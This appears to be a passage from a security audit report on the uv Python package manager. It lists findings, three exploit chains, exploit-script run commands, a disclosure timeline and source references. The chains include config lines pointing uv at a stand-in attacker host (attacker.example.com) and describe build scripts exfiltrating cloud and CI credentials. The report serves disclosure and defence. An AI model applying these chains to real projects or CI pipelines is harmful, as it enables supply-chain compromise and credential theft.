**Impact:**  
Limited. This is NOT directly exploitable via wheel installation because:

- ZIP extraction writes symlink entries as regular text files containing the target path
- The symlink mode bits (`0o120000`) are not interpreted during extraction

This vulnerability is only exploitable via direct manipulation of uv's wheel cache. An attacker with
local filesystem access could create actual symlinks in the cache and trigger reinstallation.

**Threat Model:**  
If an attacker has write access to uv's cache directory, they can do far worse than symlink attacks
(e.g., replace any cached wheel with malicious code). This is a defense-in-depth gap, not a
practical attack vector.

**Recommendation:**  
After `canonicalize()` at line 454, add a check: `target.starts_with(venv_base)`.

---

### UV-2026-004: RECORD Hash Not Validated (INFO)

**Location:** `crates/uv-install-wheel/src/wheel.rs:955-956`

**Description:**  
The RECORD file in wheels contains SHA256 hashes for each file. uv's `validate_and_heal_record()`
only checks file presence by path; the actual hashes are not verified.

**Impact:**  
None in practice. ZIP CRC32 is validated during extraction. This matches pip's behavior.

**Recommendation:**  
None required. This is consistent with the Python packaging ecosystem.

---

## Exploit Chains

The following exploit chains demonstrate that individual vulnerabilities can be combined for
end-to-end critical attacks. These chains prove the findings are not hypothetical — they represent
real-world attack paths with severe consequences.

### CHAIN-001: Supply Chain Credential Exfiltration (CRITICAL)

**Chained Vulnerabilities:** UV-2026-011 + UV-2026-001

**Attack Scenario:**

1. Attacker supplies a `requirements.txt` containing
   `--index-url http://attacker.example.com/simple/` via PR, shared CI config, or compromised
   upstream repository
2. Victim's CI pipeline runs `uv pip install -r requirements.txt`
3. UV-2026-011 causes ALL package resolution to redirect to attacker's server
4. Attacker serves a malicious sdist for a trusted package (e.g., `requests`)
5. UV-2026-001: uv passes the full environment to the build subprocess
6. `setup.py` exfiltrates `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`, `CI_DEPLOY_KEY` to attacker

**Impact:** A single line in `requirements.txt` achieves full credential theft from any developer or
CI pipeline.

**Reproduction:**

```bash
bash autofyn_audit/exploit_chains/chain_01_supply_chain_rce/run_chain.sh
```

### CHAIN-002: HTTPS Credential Exfiltration via TLS Bypass (CRITICAL)

**Chained Vulnerabilities:** UV-2026-007 + UV-2026-001

**Attack Scenario:**

1. Attacker creates a project with `pyproject.toml` containing
   `allow-insecure-host = ["attacker.example.com:443"]`
2. Developer clones the project, runs `uv pip install` with `--index-url` pointing to attacker
3. UV-2026-007: `pyproject.toml` silently disables TLS certificate verification for attacker's
   server
4. Attacker's HTTPS server (with self-signed cert) responds — normally this would cause
   `UnknownIssuer` TLS error, but pyproject.toml bypasses verification
5. UV-2026-001: Malicious build backend exfiltrates `AWS_SECRET_ACCESS_KEY`, `GITHUB_TOKEN`

**Impact:** Invisible HTTPS credential exfiltration — no TLS errors, no warnings. Attacker
compromises any developer who clones a malicious project.

**Reproduction:**

```bash
bash autofyn_audit/exploit_chains/chain_02_tls_selfupdate_rce/run_chain.sh
```

### CHAIN-003: Silent Package Replacement via Cache Poisoning (CRITICAL)

**Chained Vulnerabilities:** UV-2026-016 + UV-2026-009

**Attack Scenario:**

1. Attacker has write access to a shared CI/CD cache (NFS mount, Docker volume, overlay filesystem)
2. Attacker places a malicious wheel at an arbitrary path outside the cache
3. Attacker writes a `.rev` pointer with ArchiveId containing `../..` sequences
4. UV-2026-016: `ArchiveId::from_str()` accepts any string without validation — pointer redirects
   cache lookup to attacker's wheel path
5. Attacker strips hashes from the project's `uv.lock`
6. UV-2026-009: entries with no hash field → `HashPolicy::None` → no verification
7. Victim runs `uv sync` — malicious package installed silently with no errors or warnings

**Impact:** In shared CI environments, an attacker with cache write access can silently replace any
cached package with malicious code, bypassing all hash checks.

**Reproduction:**

```bash
bash autofyn_audit/exploit_chains/chain_03_cache_poison_silent_replace/run_chain.sh
```

---

## Reproduction Instructions

### Prerequisites

- Docker (for reproducible environment)
- OR: uv installed locally

### Using Docker (Recommended)

```bash
cd autofyn_audit
docker build -t uv-audit .
docker run --rm uv-audit bash /audit/autofyn_audit/scripts/run_all_exploits.sh
```

### Using Local uv

```bash
# From repository root
bash autofyn_audit/scripts/run_all_exploits.sh
```

### Individual Exploits

```bash
# Exploit 1: Credential Leakage
bash autofyn_audit/exploits/01_credential_leakage/run_exploit.sh

# Exploit 2: GitHub API URL Injection
bash autofyn_audit/exploits/02_github_url_injection/run_exploit.sh

# Exploit 3: Self-Update Installer Script Injection
bash autofyn_audit/exploits/03_self_update_injection/run_exploit.sh

# Exploit 4: HTML Base Tag Injection
bash autofyn_audit/exploits/05_base_tag_injection/run_exploit.sh

# Exploit 5: pyproject.toml allow-insecure-host TLS Bypass
bash autofyn_audit/exploits/06_pyproject_insecure_host/run_exploit.sh

# Exploit 6: Python Downloads JSON URL RCE
bash autofyn_audit/exploits/07_python_downloads_json/run_exploit.sh

# Exploit 7: Lockfile Hash Strip Attack
bash autofyn_audit/exploits/08_lockfile_hash_strip/run_exploit.sh

# Exploit 8: Index Name Credential Collision
bash autofyn_audit/exploits/09_index_name_collision/run_exploit.sh

# Exploit 9: requirements.txt Index URL Injection
bash autofyn_audit/exploits/10_requirements_index_injection/run_exploit.sh

# Exploit 10: Shell Config Injection
bash autofyn_audit/exploits/11_shell_config_injection/run_exploit.sh

# Exploit 11: .netrc Default Credential Leakage
bash autofyn_audit/exploits/12_netrc_default_leakage/run_exploit.sh
```

---

## Test Environment

- **Base Image:**
  `python:3.12-slim@sha256:090ba77e2958f6af52a5341f788b50b032dd4ca28377d2893dcf1ecbdfdfe203`
- **Rust Toolchain:** stable (as of audit date)
- **uv Commit:** `da5f6a6967b41423fb2a61bf094adff4e403367c`
- **uv Version:** 0.11.13 (or built from source)

---

## Disclosure Timeline

| Date       | Action                                   |
| ---------- | ---------------------------------------- |
| 2026-05-28 | Audit completed                          |
| TBD        | Report delivered to Astral security team |
| TBD        | Fix released                             |
| TBD        | Public disclosure                        |

---

## Appendix: Code References

### UV-2026-001 (Credential Leakage)

- `crates/uv-build-frontend/src/lib.rs:1203` — Command::new() inherits parent env
- `crates/uv-build-frontend/src/lib.rs:1214-1218` — Only 4 vars removed via env_remove()

### UV-2026-002 (URL Injection)

- `crates/uv-git/src/resolver.rs:101-105` — format!() with raw rev
- `crates/uv-git-types/src/reference.rs:60` — as_rev() returns unencoded string
- `crates/uv-git-types/src/reference.rs:66` — as_url_rev() exists but unused

### UV-2026-003 (Symlink Escape)

- `crates/uv-install-wheel/src/wheel.rs:453-467` — symlink validation missing boundary check
- `crates/uv-extract/src/sync.rs:87` — File::create() used, not symlink creation

### UV-2026-004 (RECORD Hash)

- `crates/uv-install-wheel/src/wheel.rs:955-956` — Comment: "We don't heal the hash"

### UV-2026-005 (Self-Update Injection)

- `crates/uv/src/commands/self_update.rs:340-395` — `run_official_updater()` downloads and executes
  installer
- `crates/uv/src/commands/self_update.rs:359-365` — `download_installer_from_urls()` with no hash
  verification
- `crates/uv/src/commands/self_update.rs:367-374` — `execute_official_installer()` immediately after
  download

### UV-2026-006 (HTML Base Tag Injection)

- `crates/uv-client/src/html.rs:170-176` — `parse_base()` accepts any URL, no same-origin check
- `crates/uv-distribution-types/src/file.rs:139-143` — `FileLocation::new()` joins relative URLs
  against attacker-controlled base

### UV-2026-007 (pyproject.toml allow-insecure-host)

- `crates/uv-settings/src/settings.rs:420-435` — `allow-insecure-host` lacks `uv_toml_only`
- `crates/uv-settings/src/settings.rs:410-418` — `no-proxy` has `uv_toml_only = true` (contrast)
- `crates/uv/src/settings.rs:344-360` — workspace globals loaded alongside CLI args

### UV-2026-008 (Python Downloads JSON URL RCE)

- `crates/uv-python/src/downloads.rs:1041` — `"http" | "https"` both accepted for JSON URL
- `crates/uv-python/src/downloads.rs:1057-1060` — JSON fetched with no integrity check
- `crates/uv-python/src/downloads.rs:963` — `sha256: Option<String>` allows null/absent hashes
- `crates/uv-python/src/downloads.rs:1442-1446` — No hasher created when `sha256.is_none()`
- `crates/uv-python/src/downloads.rs:1464-1473` — Hash check skipped when `sha256` is `None`

### UV-2026-009 (Lockfile Hash Strip Attack)

- `crates/uv-types/src/hash.rs:292-301` — Packages with empty hashes skipped with `continue`
- `crates/uv-types/src/hash.rs:40-47` — `HashStrategy::Verify` returns `HashPolicy::None` for
  missing
- `crates/uv/src/commands/project/sync.rs:823` — `uv sync` uses `HashCheckingMode::Verify`

### UV-2026-010 (Index Name Credential Collision)

- `crates/uv-distribution-types/src/index_name.rs:37-48` — `to_env_var()` maps `-`, `_`, `.` to `_`
- `crates/uv-distribution-types/src/index.rs:467-477` — `Credentials::from_env(name.to_env_var())`
- `crates/uv-auth/src/credentials.rs:259-267` — Credential lookup by normalized index name

### UV-2026-011 (requirements.txt Index URL Injection)

- `crates/uv-requirements-txt/src/lib.rs:750-780` — `--index-url` parsed from requirements.txt
- `crates/uv/src/commands/pip/install.rs:389-403` — Index URL consumed as primary package index

### UV-2026-012 (Shell Config Injection)

- `crates/uv-shell/src/lib.rs:322-333` — `backslash_escape()` missing `$` and backtick escaping
- `crates/uv-shell/src/lib.rs:266-290` — `Shell::prepend_path()` writes to shell config
- `crates/uv-dirs/src/lib.rs:24-38` — `UV_TOOL_BIN_DIR` / `UV_PYTHON_BIN_DIR` handling
- `crates/uv/src/commands/tool/update_shell.rs:72-106` — Writes PATH export to ~/.bashrc

### UV-2026-013 (.netrc Default Credential Leakage)

- `crates/uv-auth/src/credentials.rs:208-214` — `.or_else(|| netrc.hosts.get("default"))` fallback
- `crates/uv-netrc/src/lib.rs:59-106` — `Netrc::new()` reads from `$NETRC` or `~/.netrc`
- `crates/uv-auth/src/middleware.rs:835-844` — Credential lookup triggers on 401 response
